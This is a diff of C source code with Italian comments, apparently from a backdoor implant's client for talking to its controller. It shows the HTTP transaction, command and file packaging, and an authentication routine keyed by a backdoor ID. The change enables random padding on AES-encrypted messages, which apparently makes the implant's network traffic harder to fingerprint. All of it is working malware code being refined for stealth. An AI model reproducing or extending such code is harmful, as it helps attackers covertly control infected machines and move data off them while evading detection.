@@ -429,6 +429,8 @@ BOOL HttpTransaction(BYTE *s_buffer, DWORD sbuf_len, BYTE **r_buffer, DWORD *res
 
 	} while(n_read>0 && dwContentLength>0);
 
+	// Arrotonda per eliminare i byte aggiunti per padding random
+	*response_len -= ((*response_len)%16);
 	return TRUE;
 }
 
@@ -446,9 +448,7 @@ BYTE *PreapareCommand(DWORD command, BYTE *message, DWORD msg_len, DWORD *ret_le
 	if (ret_len)
 		*ret_len = 0;
 
-	// rand_pad_len = rand()%16;
-	// XXX-Padding
-	rand_pad_len = 0;
+	rand_pad_len = rand()%16;
 
 	// arrotonda 
 	pad_len = tot_len = sizeof(DWORD) + msg_len + SHA_DIGEST_LENGTH;
@@ -485,7 +485,7 @@ BYTE *PreapareCommand(DWORD command, BYTE *message, DWORD msg_len, DWORD *ret_le
 	aes_set_key( &crypt_ctx, (BYTE *)asp_global_session_key, 128);
 	memset(iv, 0, sizeof(iv));
 	aes_cbc_encrypt(&crypt_ctx, iv, buffer, buffer, tot_len);
-	//rand_bin_seq(buffer + tot_len, rand_pad_len);
+	rand_bin_seq(buffer + tot_len, rand_pad_len);
 
 	if (ret_len)
 		*ret_len = tot_len + rand_pad_len;
@@ -510,9 +510,7 @@ BYTE *PrepareFile(WCHAR *file_path, DWORD *ret_len)
 	if (ret_len)
 		*ret_len = 0;
 
-	// rand_pad_len = rand()%16;
-	// XXX-Padding
-	rand_pad_len = 0;
+	rand_pad_len = rand()%16;
 
 	// Legge la lunghezza del body del file
 	hfile = CreateFileW(file_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
@@ -573,7 +571,7 @@ BYTE *PrepareFile(WCHAR *file_path, DWORD *ret_len)
 	aes_set_key( &crypt_ctx, (BYTE *)asp_global_session_key, 128);
 	memset(iv, 0, sizeof(iv));
 	aes_cbc_encrypt(&crypt_ctx, iv, buffer, buffer, tot_len);
-	//rand_bin_seq(buffer + tot_len, rand_pad_len);
+	rand_bin_seq(buffer + tot_len, rand_pad_len);
 
 	if (ret_len)
 		*ret_len = tot_len + rand_pad_len;
@@ -809,10 +807,8 @@ BOOL H_ASP_Auth(char *signature, DWORD sig_len, char *backdoor_id, DWORD bid_len
 	aes_set_key( &crypt_ctx, (BYTE *)signature, 128);
 	memset(iv, 0, sizeof(iv));
 	aes_cbc_encrypt(&crypt_ctx, iv, buffer, buffer, AUTH_REAL_LEN);
-	// rand_pad_len = rand()%16;
-	// XXX-Padding
-	rand_pad_len = 0;
-	//rand_bin_seq(buffer+AUTH_REAL_LEN, rand_pad_len);
+	rand_pad_len = rand()%16;
+	rand_bin_seq(buffer+AUTH_REAL_LEN, rand_pad_len);
 
 	// Invia la richiesta
 	if (!HttpTransaction(buffer, AUTH_REAL_LEN + rand_pad_len, &response, &response_len, WIRESPEED))
